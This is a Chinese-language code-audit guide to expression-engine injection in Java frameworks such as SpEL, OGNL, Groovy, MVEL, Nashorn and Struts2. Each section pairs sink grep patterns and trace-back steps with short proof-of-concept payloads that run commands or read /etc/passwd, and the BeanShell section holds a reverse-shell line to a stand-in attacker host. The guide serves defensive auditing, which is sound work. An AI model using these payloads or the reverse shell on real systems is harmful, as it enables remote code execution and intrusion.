# 表达式引擎注入

## 目录

| 子模式 | Sink点API | 严重度 |
|--------|----------|--------|
| §SpEL | `SpelExpressionParser.parseExpression()`, `Expression.getValue()` | 高 |
| §OGNL | `Ognl.getValue()`, `ValueStack.findValue()` | 高 |
| §EL | `ExpressionFactory.createValueExpression()`, `ValueExpression.getValue()` | 中 |
| §Groovy | `GroovyShell.evaluate()`, `GroovyShell.parse()`, `Eval.me()` | 高 |
| §Beanshell | `bsh.Interpreter.eval()`, `Interpreter.source()` | 高 |
| §MVEL | `MVEL.eval()`, `MVEL.compileExpression()` | 高 |
| §Jexl | `JexlEngine.createExpression()`, `Expression.evaluate()` | 中 |
| §Fel | `FelEngine.eval()`, `Fel.compile()` | 中 |
| §Jsel | `JselEvaluator.evaluate()` | 中 |
| §Aviator | `AviatorEvaluator.execute()`, `AviatorEvaluator.compileExpression()` | 中 |
| §QLExpress | `ExpressRunner.execute()`, `QLExpressRunTime.evaluate()` | 高 |
| §Nashorn | `ScriptEngine.eval()` | 高 |
| §JRuby | `ScriptingContainer.eval()`, `parse()` | 高 |
| §Jython | `PythonInterpreter.exec()`, `eval()` | 高 |
| §Drools | `KieSession.fireAllRules()` | 中 |
| §EasyRules | `RulesEngine.fire()` | 中 |
| §Struts2 | `ParametersInterceptor`, `ActionContext` | 高 |
| §BME | `TextParseUtil.translateVariables()`, `ValueStack.findValue()` | 高 |
| §JasperReport | `JasperCompileManager.compile()`, `JasperFillManager.fill()` | 中 |
| §MEL | `muleContext.getExpressionManager().evaluate()` | 中 |

---

## §SpEL

### AP3502.901 SpEL注入

### Sink点 (必须通过LSP回溯确认参数可控)

**Sink点Grep模式**:
```
SpelExpressionParser
parseExpression(
Expression
getValue()
setVariable
setRootObject
```

**LSP回溯示例**:
```java
// Sink点代码
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(expression);  // ← Sink点
exp.getValue();

// LSP操作:
// 1. 对 'expression' 参数 → Find References → 追溯到 request.getParameter("expr")
// 2. 确认参数来自外部输入 → 报告漏洞
```

### 漏洞发现

**grep关键词**: `SpelExpressionParser`, `parseExpression`, `StandardEvaluationContext`, `#{`, `getValue`

**危险模式**:
```java
// 危险: 用户输入直接作为表达式
String userInput = request.getParameter("expr");
Expression exp = parser.parseExpression(userInput);
exp.getValue();

// 危险: 拼接用户输入到SpEL表达式
parser.parseExpression("T(java.lang.Runtime).getRuntime().exec('" + userInput + "')");
```

### POC关键片段

```java
#{T(java.lang.Runtime).getRuntime().exec('id')}
#{new java.io.File('/etc/passwd').text}
#{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
```

### 防护建议
- 使用`SimpleEvaluationContext`替代`StandardEvaluationContext`
- 白名单限制可调用的类和方法
- 用户输入不直接作为表达式解析

---

## §OGNL

### AP3502.002 OGNL注入

### Sink点

**Sink点Grep模式**:
```
Ognl.getValue
Ognl.parseExpression
ValueStack.findValue
ValueStack.setValue
%{
```

**LSP回溯示例**:
```java
// Sink点代码
Object result = Ognl.getValue(expression, context);  // ← Sink点

// LSP操作:
// 1. 对 'expression' 参数 → Find References
// 2. 追溯到 ActionContext.getContext().getValueStack()
```

### 漏洞发现

**grep关键词**: `ognl.Ognl`, `ValueStack.findValue`, `%{expression}`

**危险模式**:
```java
Object result = Ognl.getValue(userInput, context);
ValueStack.findValue(userExpression, false);
```

### POC关键片段

```java
%{T(java.lang.Runtime).getRuntime().exec('id')}
%{@java.lang.System@getProperty('user.dir')}
```

### 防护建议
- OGNL表达式禁用`#this`引用
- 不允许直接解析用户输入的OGNL字符串

---

### AP3502.906 Struts2 OGNL

### Sink点

**Sink点Grep模式**:
```
ParametersInterceptor
ActionContext.getContext
ServletActionContext
getParameter
valueStack.findValue
```

**LSP回溯示例**:
```java
// Sink点 - Struts2参数通过拦截器注入值栈
public class ParametersInterceptor extends ... {
    private void setParameters(Action action, HttpServletRequest request) {
        // 参数名/值被当作OGNL表达式求值
    }
}
// LSP操作: 追溯Action的setter方法参数来源
```

### 漏洞发现

**grep关键词**: `ParametersInterceptor`, `ActionContext`, `ServletActionContext`

**危险模式**:
```java
// 当user参数被OGNL解析时注入
public class UserAction extends ActionSupport {
    private String user;
    public void setUser(String user) { this.user = user; }  // ← Sink点
}
```

### POC关键片段

```java
GET /action?name=%{666*777}
GET /action?redirect=%{new+java.lang.ProcessBuilder('id').start()}
```

### 防护建议
- 升级Struts2到最新版本
- 禁用ParametersInterceptor的alwaysSelectFullChain

---

## §EL

### AP3502.902 EL注入

### Sink点

**Sink点Grep模式**:
```
ExpressionFactory.createValueExpression
ValueExpression.getValue
ELResolver
${}
#{}
```

**LSP回溯示例**:
```java
ExpressionFactory factory = new ExpressionFactory();
ValueExpression ve = factory.createValueExpression(elContext, userInput, String.class);
ve.getValue(elContext);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `ExpressionFactory`, `ValueExpression`, `ELResolver`

**危险模式**:
```java
ValueExpression ve = factory.createValueExpression(elContext, userInput, String.class);
ve.getValue(elContext);
```

### POC关键片段

```java
${pageContext.request.getSession().setAttribute('abc',param.foo)}
${applicationScope}
```

### 防护建议
- 不将用户输入作为EL表达式解析
- 使用白名单验证输入

---

## §Groovy

### AP3502.903 Groovy注入

### Sink点

**Sink点Grep模式**:
```
GroovyShell
GroovyShell.evaluate
GroovyShell.parse
GroovyClassLoader.parseClass
Eval.me
```

**LSP回溯示例**:
```java
// Sink点
GroovyShell shell = new GroovyShell();
Object result = shell.evaluate(userScript);  // ← Sink点

// LSP操作:
// 1. 对 'userScript' → Find References → 追溯来源
// 2. 确认是否来自外部输入
```

### 漏洞发现

**grep关键词**: `GroovyShell`, `evaluate`, `parse`, `GroovyClassLoader`

**危险模式**:
```java
GroovyShell shell = new GroovyShell();
shell.evaluate(userInput);  // RCE
Script script = shell.parse(userInput);
```

### POC关键片段

```java
new GroovyShell().evaluate("Runtime.getRuntime().exec('id')")
new File('/etc/passwd').text
''.class.classLoader.loadClass('java.lang.Runtime')
```

### 防护建议
- 使用GroovyShell的Binding限制可访问变量
- 禁用MethodClosure和ExpandoMetaClass

---

## §Beanshell

### AP3502.907 Beanshell注入

### Sink点

**Sink点Grep模式**:
```
bsh.Interpreter
Interpreter.eval
Interpreter.source
Interpreter.get
```

**LSP回溯示例**:
```java
Interpreter i = new Interpreter();
i.eval("cmd = \"\"\" + userInput + \"\"\";");  // ← Sink点
i.source("script.bsh");
```

### 漏洞发现

**grep关键词**: `bsh.Interpreter`, `Interpreter.eval`

**危险模式**:
```java
Interpreter i = new Interpreter();
i.eval("Runtime.getRuntime().exec('" + userInput + "');");
```

### POC关键片段

```java
exec("bash -i >& /dev/tcp/attacker/6666 0>&1");
Runtime.getRuntime().exec("id");
```

### 防护建议
- 不将用户输入直接传给BeanShell解释器
- 使用SecurityManager限制

---

## §MVEL

### AP3502.910 MVEL注入

### Sink点

**Sink点Grep模式**:
```
MVEL.eval
MVEL.compileExpression
MVEL.executeExpression
mvEl
MVELInterpreter
```

**LSP回溯示例**:
```java
Object result = MVEL.eval(userInput, context);  // ← Sink点
CompiledExpression compiled = MVEL.compileExpression(userInput);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `MVEL.eval`, `MVEL.compileExpression`

**危险模式**:
```java
MVEL.eval(userInput, context);
MVEL.compileExpression(userInput);
```

### POC关键片段

```java
{java.lang.Runtime.getRuntime().exec('id')}
{'a'.getClass().forName('java.lang.Runtime')}
```

### 防护建议
- 使用MVEL的TrustConfiguration安全模式
- 白名单限制可调用的类

---

## §Jexl

### AP3502.908 Jexl注入

### Sink点

**Sink点Grep模式**:
```
JexlEngine
JexlEngine.createExpression
Expression.evaluate
org.apache.commons.jexl3
```

**LSP回溯示例**:
```java
JexlEngine engine = new JexlEngine();
Expression expr = engine.createExpression(userInput);  // ← Sink点
Object result = expr.evaluate(context);
```

### 漏洞发现

**grep关键词**: `JexlEngine`, `createExpression`, `Expression.evaluate`

**危险模式**:
```java
Expression expr = engine.createExpression(userInput);
expr.evaluate(context);
```

### POC关键片段

```java
new java.lang.ProcessBuilder('id').start()
Runtime.runtime.exec('id')
```

### 防护建议
- 使用JexlEngine.setSandboxed(true)
- 白名单限制可访问的类和方法

---

## §Fel

### AP3502.909 Fel注入

### Sink点

**Sink点Grep模式**:
```
FelEngine
Fel.eval
Fel.compile
com.greenline.util.fel
```

**LSP回溯示例**:
```java
FelEngine engine = new FelEngine();
Object result = engine.eval(userInput);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `FelEngine`, `Fel.eval`

**危险模式**:
```java
FelEngine engine = new FelEngine();
engine.eval(userInput);
```

### POC关键片段

```java
(ProcessBuilder.start(('id'.split(' '))))
System.getProperty('os.name')
```

### 防护建议
- 使用Fel的白名单安全配置
- 限制Fel上下文中的可访问类

---

## §Jsel

### AP3502.911 Jsel注入

### Sink点

**Sink点Grep模式**:
```
JselEvaluator
ExpressionEngine
org.jsel.engine
evaluate
```

**LSP回溯示例**:
```java
JselEvaluator evaluator = new JselEvaluator();
Object result = evaluator.evaluate(userInput, context);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `JselEvaluator`, `ExpressionEngine`

**危险模式**:
```java
evaluator.evaluate(userInput, context);
```

### POC关键片段

```java
{java.lang.Runtime.getRuntime().exec('id')}
```

### 防护建议
- 不将用户输入直接作为Jsel表达式
- 使用SecurityManager限制

---

## §Aviator

### AP3502.007 Aviator注入

### Sink点

**Sink点Grep模式**:
```
AviatorEvaluator.execute
AviatorEvaluator.compileExpression
com.googlecode.aviator
AviatorFunctions
```

**LSP回溯示例**:
```java
Object result = AviatorEvaluator.execute(userInput);  // ← Sink点
CompiledExpression compiled = AviatorEvaluator.compileExpression(userInput);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `AviatorEvaluator`, `execute`, `compileExpression`

**危险模式**:
```java
AviatorEvaluator.execute(userInput);
AviatorEvaluator.compileExpression(userInput);
```

### POC关键片段

```java
execute('id')
loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null)
```

### 防护建议
- 使用Aviator的安全模式配置
- 白名单限制可调用的方法

---

## §QLExpress

### AP3502.005 QLExpress注入

### Sink点

**Sink点Grep模式**:
```
ExpressRunner
QLExpressRunTime
evaluate
execute
com.ql.util.express
```

**LSP回溯示例**:
```java
ExpressRunner runner = new ExpressRunner();
Object result = runner.execute(userInput, context);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `ExpressRunner`, `QLExpressRunTime`, `evaluate`, `execute`

**危险模式**:
```java
ExpressRunner runner = new ExpressRunner();
runner.execute(userInput, context);
```

### POC关键片段

```java
java.lang.Runtime.getRuntime().exec('id')
''.class.forName('java.lang.Runtime')
```

### 防护建议
- 使用QLExpress的安全配置(白名单模式)
- 禁用可以通过表达式访问的系统类

---

## §Nashorn

### AP3502.001 JS引擎注入

### Sink点

**Sink点Grep模式**:
```
ScriptEngineManager.getEngineByName("nashorn")
ScriptEngine.eval
NashornScriptEngineFactory
```

**LSP回溯示例**:
```java
ScriptEngine engine = new ScriptEngineManager()
    .getEngineByName("nashorn");
engine.eval(userInput);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `ScriptEngine`, `Nashorn`, `eval`

**危险模式**:
```java
ScriptEngine engine = new ScriptEngineManager()
    .getEngineByName("nashorn");
engine.eval(userInput);
```

### POC关键片段

```java
eval("java.lang.Runtime.getRuntime().exec('id')");
loadClass('java.lang.Runtime')
```

### 防护建议
- 使用delight-nashorn-sandbox等沙箱库
- 设置SecurityManager限制

---

### AP3502.003 Nashorn沙箱逃逸

### Sink点

**Sink点Grep模式**:
```
NashornSandbox
NashornSandbox.eval
ScriptContext.getBindings
java.type
Java.type
```

**LSP回溯示例**:
```java
NashornSandbox sandbox = NashornSandbox.getInstance();
sandbox.eval(userInput);  // ← Sink点 (可能存在沙箱逃逸)
```

### 漏洞发现

**grep关键词**: `NashornSandbox`, `ScriptContext`, `java.type`

**危险模式**:
```java
NashornSandbox sandbox = NashornSandbox.getInstance();
sandbox.eval(userInput);
// 逃逸: 利用Java.type访问受限类
```

### POC关键片段

```java
var System = Java.type('java.lang.System');
Thread.currentThread().setContextClassLoader(loader);
```

### 防护建议
- 升级到Java 15+ (Nashorn已移除)
- 使用GraalJS替代Nashorn

---

## §JRuby

### AP3502.004 JRuby注入

### Sink点

**Sink点Grep模式**:
```
ScriptingContainer
parseMethod
run
eval
org.jruby.embed
```

**LSP回溯示例**:
```java
ScriptingContainer container = new ScriptingContainer();
container.eval(userInput);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `ScriptingContainer`, `JRubyEngine`

**危险模式**:
```java
ScriptingContainer container = new ScriptingContainer();
container.eval(userInput);
```

### POC关键片段

```java
java.lang.Runtime.getRuntime().exec('id')
File.read('/etc/passwd')
```

### 防护建议
- 用户输入不直接作为JRuby脚本
- 使用JRuby的安全模式配置

---

## §Jython

### AP3502.006 Jython注入

### Sink点

**Sink点Grep模式**:
```
PythonInterpreter
exec
eval
org.python.util
JythonEngine
```

**LSP回溯示例**:
```java
PythonInterpreter interp = new PythonInterpreter();
interp.exec(userInput);  // ← Sink点
interp.eval("os.system('id')");
```

### 漏洞发现

**grep关键词**: `PythonInterpreter`, `JythonEngine`

**危险模式**:
```java
PythonInterpreter interp = new PythonInterpreter();
interp.exec(userInput);
```

### POC关键片段

```java
import os
os.system('id')
from java.lang import Runtime
```

### 防护建议
- 用户输入不直接作为Jython代码
- 使用Jython的安全限制配置

---

## §规则引擎

### AP3502.912 Drools注入

### Sink点

**Sink点Grep模式**:
```
KieSession
fireAllRules
insert
RuleFlowProcess
KnowledgeBuilder
org.drools
```

**LSP回溯示例**:
```java
KieSession ksession = kbase.newStatefulKnessSession();
ksession.insert(facts);
ksession.fireAllRules();  // ← Sink点 (规则中可能含恶意代码)
```

### 漏洞发现

**grep关键词**: `KieSession`, `fireAllRules`, `Drools`

**危险模式**:
```java
KieSession ksession = kbase.newStatefulKnessSession();
ksession.fireAllRules();  // 规则内容可能用户可控
```

### POC关键片段

```java
rule "RCE"
when
    $m : Message()
then
    System.exit(0)
end
```

### 防护建议
- 规则文件存储在安全位置，用户不可控
- 使用Kie沙箱配置

---

### AP3502.015 Easy Rules注入

### Sink点

**Sink点Grep模式**:
```
RulesEngine
Rule
@Condition
@Action
org.jeasy.rules
```

**LSP回溯示例**:
```java
RulesEngine engine = new DefaultRulesEngine();
Rules rules = new Rules();
rules.register(new RuleDefinition() {
    @Condition
    public boolean evaluate() { return userInput.equals("true"); }  // ← Sink点
});
engine.fire(rules);
```

### 漏洞发现

**grep关键词**: `RulesEngine`, `@Condition`, `@Action`

**危险模式**:
```java
@Condition("userInput.length() > 0 && java.lang.Runtime.getRuntime().exec('id') != null")
```

### POC关键片段

```java
@Condition("java.lang.Runtime.getRuntime().exec('id') != null")
@Action
public void execute() { Runtime.getRuntime().exec("id"); }
```

### 防护建议
- 规则定义不包含用户输入
- 使用参数化规则

---

## §Struts2

### AP3502.904 Struts2代码注入

### Sink点

**Sink点Grep模式**:
```
struts.xml
<action>
<result>
redirect
chain
action:
```

**LSP回溯示例**:
```xml
<!-- Sink点: redirect参数注入 -->
<action name="test">
    <result type="redirect">/success?param=${userInput}</result>  <!-- ← Sink点 -->
</action>
```

### 漏洞发现

**grep关键词**: `struts.xml`, `redirect`, `chain`, `${expression}`

**危险模式**:
```xml
<result type="redirect">/success?param=${userInput}</result>
<result type="chain">step2?name=${userInput}</result>
```

### POC关键片段

```java
GET /test.action?redirect=%{666*777}
GET /test.action?redirect=%{new+java.lang.ProcessBuilder('id').start()}
```

### 防护建议
- 升级Struts2到最新版本
- 不要在redirect参数中使用OGNL表达式

---

## §BME

### AP3502.905 BME注入

### Sink点

**Sink点Grep模式**:
```
TextParseUtil.translateVariables
ValueStack.findValue
BME
ComponentUtils
OgnlUtil
com.opensymphony.xwork2.util
```

**LSP回溯示例**:
```java
// Sink点: BME组件的文本解析
TextParseUtil.translateVariables("%{userInput}", valueStack);  // ← Sink点
ValueStack.findValue("%{expression}", String.class);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `TextParseUtil`, `BME`, `ValueStack.findValue`

**危险模式**:
```java
TextParseUtil.translateVariables("%{userInput}", valueStack);
ValueStack.findValue("%{expression}", String.class);
```

### POC关键片段

```java
%{new java.lang.ProcessBuilder('id').start()}
%{@java.lang.System@getProperty('user.dir')}
```

### 防护建议
- 升级Struts2到最新版本
- 禁用BME的变量转换功能

---

## §报表组件

### AP3502.913 Jasper注入

### Sink点

**Sink点Grep模式**:
```
JasperCompileManager
JasperFillManager
JasperReport
JREvaluator
net.sf.jasperreports
```

**LSP回溯示例**:
```java
JasperReport report = JasperCompileManager.compileReport(userXML);
JasperPrint print = JasperFillManager.fillReport(report, params);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `JasperCompileManager`, `JasperFillManager`

**危险模式**:
```java
JasperReport report = JasperCompileManager.compileReport(userXML);
JasperPrint print = JasperFillManager.fillReport(report, userParams);
```

### POC关键片段

```java
$F{userInput} = "#{java.lang.Runtime.getRuntime().exec('id')}"
$P{userParam}.toString()
```

### 防护建议
- 报表字段使用白名单验证
- 不将用户输入直接作为报表表达式
- 升级JasperReports到最新版本

---

### AP3502.914 MEL/DataWeave注入

### Sink点

**Sink点Grep模式**:
```
muleContext.getExpressionManager
evaluate
dw::
message.payload
flowVariables
org.mule
```

**LSP回溯示例**:
```java
Object result = muleContext.getExpressionManager().evaluate(userExpression, muleMessage);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `muleContext`, `ExpressionManager`, `evaluate`

**危险模式**:
```java
#[flowVars['userInput']]
#[message.inboundProperties['userHeader']]
```

### POC关键片段

```java
#[java.lang.Runtime.getRuntime().exec('id')]
#[new java.io.File('/etc/passwd').text]
```

### 防护建议
- MEL表达式不直接解析用户输入
- 使用DataWeave的白名单模式